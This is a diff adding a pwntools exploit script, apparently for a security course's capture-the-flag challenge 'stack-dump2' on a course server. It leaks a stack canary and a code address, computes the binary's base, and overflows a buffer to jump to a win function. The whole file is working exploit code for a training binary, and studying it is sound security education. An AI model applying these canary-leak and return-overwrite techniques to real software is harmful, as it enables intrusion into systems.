@@ -1,0 +1,122 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template
+from pwn import *
+import sys
+# Set up pwntools for the correct architecture
+context.update(arch='i386')
+exe = './stack-dump2' #Change this
+
+PROGNAME = exe
+REMOTE = "comp6447.wtf" #Change this
+REMOTEPORT = 28004 #Change this
+global p
+global e
+global global_timeout
+
+e = ELF(PROGNAME)
+
+# Many built-in settings can be controlled on the command-line and show up
+# in "args".  For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
+
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.GDB:
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+gdbscript = '''
+continue
+'''.format(**locals())
+
+if args.REMOTE:
+    global_timeout = 3
+    p = remote(REMOTE, REMOTEPORT)
+else:
+    global_timeout = 0.5
+    p = process(PROGNAME)
+    p = start()
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+
+# Possible canary offset from provided stack pointer:
+# 21 (0x15), -1363 (0-x553)
+# win function offset: 0x76d
+# __libc_csu_init offset = 0x9a0
+# 0xffe9f84c —▸ 0x5664c9eb (__libc_csu_init+75) ◂— 0x8301c783
+# 0xffe9f85c —▸ 0x5664c9c1 (__libc_csu_init+33) ◂— 0xff00838d
+
+p.recvuntil(b'useful stack pointer ', drop=True)
+stack_pointer = p.recvline()
+log.info(stack_pointer)
+stack_pointer_canary = int(stack_pointer, 16) + 105
+#log.info(str(stack_pointer_canary))
+stack_pointer_function = int(stack_pointer, 16) + 69
+#log.info(str(stack_pointer_function))
+#
+canary_addr = p32(stack_pointer_canary)
+# This stack addr points to the __libc_csu_init+75 function address
+function_addr = p32(stack_pointer_function)
+log.info(str(canary_addr))
+log.info(str(function_addr))
+
+
+# Leak canary
+p.recvuntil(b'quit', drop=True)
+p.sendline(b'a')
+p.recvuntil(b'len: ', drop=True)
+p.sendline(b'6')
+p.sendline(canary_addr)
+
+p.recvuntil(b'quit', drop=True)
+p.sendline(b'b')
+p.recvline()
+canary = p.recvline()
+log.info(f"Canary: {canary}")
+canary = canary[22:26]
+log.info(f"Canary: {canary}")
+
+# Leak function
+p.recvuntil(b'quit', drop=True)
+p.sendline(b'a')
+p.recvuntil(b'len: ', drop=True)
+p.sendline(b'6')
+
+p.sendline(function_addr)
+
+p.recvuntil(b'quit', drop=True)
+p.sendline(b'b')
+p.recvline()
+function = p.recvline()
+log.info(f"Function: {function}")
+function = function[22:26]
+log.info(f"Function: {function}")
+
+# Get base to use the win function offset
+function = u32(function)
+log.info(f"function: {function}")
+base = function - 75 - 0x9a0
+win = base + 0x76d
+log.info(f"base address: {base}")
+win = p32(win)
+log.info(str(win))
+size = 96 + 4 + 8 + 4 + 1
+
+p.recvuntil(b'quit', drop=True)
+p.sendline(b'a')
+p.recvuntil(b'len: ', drop=True)
+p.sendline(str(size))
+payload = b'a'*96 + canary + b'a'*8 + win
+p.sendline(payload)
+
+p.interactive()
+
